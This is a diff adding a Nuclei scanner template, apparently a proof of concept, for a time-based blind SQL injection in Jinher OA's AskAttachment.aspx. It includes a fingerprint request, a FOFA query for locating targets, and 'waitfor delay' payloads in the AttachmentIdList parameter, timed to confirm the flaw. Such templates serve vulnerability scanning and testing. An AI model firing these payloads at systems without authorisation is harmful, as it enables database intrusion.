@@ -1,0 +1,42 @@
+id: poc-yaml-jinher-askattachment-aspx-sqli
+info:
+  name: "金和 OA AskAttachment.aspx SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 金和OA
+  metadata:
+    finger: \u91d1\u548cOA
+    fofa: app="\u91d1\u548c\u7f51\u7edc-\u91d1\u548cOA"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers:
+      - type: word
+        words:
+          - "JHSoft"
+        part: body
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.Ask/AskAttachment.aspx/?AttachmentIdList=1)waitfor+delay'0:0:5'--"
+      - "{{BaseURL}}/c6/Jhsoft.Web.Ask/AskAttachment.aspx/?AttachmentIdList=1)waitfor+delay'0:0:8'--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "SessionId="
+        part: header
+      - type: dsl
+        dsl:
+          - body == ""
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
